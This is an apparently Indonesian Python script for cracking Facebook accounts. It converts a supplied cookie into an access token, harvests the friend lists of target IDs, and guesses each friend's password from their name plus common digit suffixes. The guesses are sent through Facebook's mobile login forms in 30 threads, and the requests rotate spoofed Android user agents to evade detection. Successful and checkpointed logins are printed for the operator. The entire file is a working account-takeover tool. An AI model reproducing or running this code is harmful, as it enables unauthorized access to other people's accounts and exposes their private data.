try:import requests,bs4,os,sys,rich,random,time
except:os.system("pip install requests bs4 rich")
from bs4 import BeautifulSoup as par
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as pol
uid,loop,uaa=[],0,[]
def clear():os.system("clear")
for lite in range(10000):
	a='Mozilla/5.0 (Linux; Android';b=random.randrange(1, 11);c=random.randrange(1, 9);d='SAMSUNG SM-R835F)';e=random.randrange(100, 9999);f='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/';g=random.randrange(1, 9);h=random.randrange(1, 4);i=random.randrange(1, 4);j=random.randrange(1, 4);k='Mobile Safari/537.36';uak=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uak)
	rr = random.randint;rc = random.choice
	u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
	u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J610G Build/PPR1.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
	u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-G610M Build/PKQ1.{str(rr(111111,210000))}.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
	u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2109 Build/RKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
	u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/PKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
	UAK = random.choice([u1, u2, u3, u4, u5]);uaa.append(UAK)
def login():
	data2={};data={};ses=requests.Session();cok=input("cookies facebok : ")
	try:
		link = ses.post('https://graph.facebook.com/v16.0/device/login/', data={'access_token': '661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e', 'scope': ''}).json();kode,user = link['code'],link['user_code'];vers = par(ses.get(f'https://mbasic.facebook.com/device', cookies={'cookie': cok}).content, 'html.parser');item = ['fb_dtsg','jazoest','qr']
		for x in vers.find_all('input'):
			if x.get('name') in item:aset = {x.get('name'):x.get('value')};data.update(aset)
		data.update({'user_code':user});meta = par(ses.post('https://mbasic.facebook.com'+vers.find('form', method='post').get('action'), data=data, cookies={'cookie': cok}).text, 'html.parser');xzxz  = meta.find('form',{'method':'post'})
		for x in xzxz('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__' : pass
				else:data2.update({x['name']:x['value']})
			except Exception as e:pass
		ses.post(f'https://mbasic.facebook.com{xzxz["action"]}', data=data2, cookies={'cookie':cok});token = ses.get(f'https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e').json()['access_token'];cetak('\n[√] Akses Token Anda : '+token);open("data.text","w").write(f"{cok}\n{token}");exit("kamu berhasil login")
	except Exception as e:cetak("[bold red] cookie invalid");exit(e)
def logo():cetak("""
[bold red]     ___  __  _____  _____  __   ______________
[bold red]    / _ \/ / / / _ )/ ___/ / /  /  _/_  __/ __/
[bold white] / ___/ /_/ / _  / (_ / / /___/ /  / / / _/ • MOBILE
[bold white]/_/   \____/____/\___/ /____/___/ /_/ /___/  
                                             
""")
def menu():
	clear();logo();cetak("gunakan koma jika lebih dari satu")
	target=input("ID TARGET : ").split(",")
	for c in target:dump(c)
	pawsord(input("mbasic/mobile : ").lower())
def dump(user):
	try:tok=open('data.text','r').readlines()[1]
	except:exit("kamu belum login")
	try:
		freya = requests.get('https://graph.facebook.com/v16.0/'+user+'?fields=friends.fields(id,name).limit(5000)&access_token='+tok,cookies={'cookie': open('data.text','r').readlines()[0].replace("\n","")}).json()['friends']['data']
		for x in freya:uid.append(x)
	except Exception as e:print(e);exit("id tidak publik atau cookie & token mokad")
def pawsord(metod):
	global loop
	with pol(max_workers=30) as tamsis:
		try:
			for id in uid:
				user=id["id"];nama=id["name"].split(" ")[0];kecil=id["name"].lower();namke=kecil.split(" ")[0]
				if len(nama)<2:pw=[namke+'123456',namke+'12345',kecil,nama+"12345",nama+"123456"]
				else:pw=[namke+'123',namke+'1234',namke+'123456',namke+'12345',kecil,nama+"1234",nama+"123",nama+"12345",nama+"123456"]
				if "mbasic" in metod:tamsis.submit(mbasic_vall,user,pw)
				elif "mobile" in metod:tamsis.submit(mobil_vall,user,pw)
				loop+=1
		except Exception as e:print(e)
	exit()
def mbasic_vall(user,pws):
	global loop
	print(f"\rcracking {loop}",end="")
	sys.stdout.flush()
	for pw in pws:
		try:
			data={};ses=requests.Session();login=par(ses.get("https://mbasic.facebook.com/login/device-based/password/?uid="+user+"&flow=login_no_pin&wtsid=rdr_0NNmWryZ5NTSm5myO&refsrc=deprecated&ref=dbl&_rdr").text,"html.parser");head={"Host": "mbasic.facebook.com","content-length": "81","cache-control": "max-age=0","viewport-width": "980","sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "Android","sec-ch-ua-platform-version": "9.0.0","sec-ch-ua-full-version-list": '"Google Chrome";v="113.0.5672.162", "Chromium";v="113.0.5672.162", "Not-A.Brand";v="24.0.0.0"',"sec-ch-prefers-color-scheme": "light","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/device-based/password/?uid=1488575208&flow=login_no_pin&wtsid=rdr_0NNmWryZ5NTSm5myO&refsrc=deprecated&ref=dbl&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			for x in login("input"):data.update({x.get("name"):x.get("value"),"pass":pw})
			head.update({"user-agent": random.choice(uaa)});ses.post("https://mbasic.facebook.com"+login.find("form",{"method":"post"}).get("action"),data=data,headers=head)
			if "c_user" in ses.cookies.get_dict().keys():print(f"\nOK | {user}|{pw}");break
			elif "checkpoint" in ses.cookies.get_dict().keys():print(f"\nCP | {user}|{pw}");break
		except(requests.exceptions.ConnectionError):time.sleep(30)
def mobil_vall(user,pws):
	global loop
	print(f"\rcracking {loop}",end="");sys.stdout.flush()
	for pw in pws:
		try:
			ses=requests.Session();data={};head={"Host": "m.facebook.com","content-length": "256","cache-control": "max-age=0","viewport-width": "980","sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "Android","sec-ch-ua-platform-version": "9.0.0","sec-ch-ua-full-version-list": '"Google Chrome";v="113.0.5672.162", "Chromium";v="113.0.5672.162", "Not-A.Brand";v="24.0.0.0"',"sec-ch-prefers-color-scheme": "light","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/device-based/password/?uid=1488575208&flow=login_no_pin&wtsid=rdr_0NNmWryZ5NTSm5myO&refsrc=deprecated&ref=dbl&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"};login=par(ses.get("https://m.facebook.com/login/device-based/password/?uid="+user+"&flow=login_no_pin&wtsid=rdr_0NNmWryZ5NTSm5myO&refsrc=deprecated&ref=dbl&_rdr").text,"html.parser")
			for x in login("input"):data.update({x.get("name"):x.get("value"),"pass":pw})
			head.update({"user-agent": random.choice(uaa)});ses.post("https://m.facebook.com"+login.find("form",{"method":"post"}).get("action"),data=data)
			if "c_user" in ses.cookies.get_dict().keys():print(f"\nOK | {user}|{pw}");break
			elif "checkpoint" in ses.cookies.get_dict().keys():print(f"\nCP | {user}|{pw}");break
		except(requests.exceptions.ConnectionError):time.sleep(30)
def menu_awal():
	logo();print("ketik login jika kamu belum login")
	pil=input("login/crack : ")
	if pil in ["login","Login"]:login()
	else:menu()
clear();menu_awal()
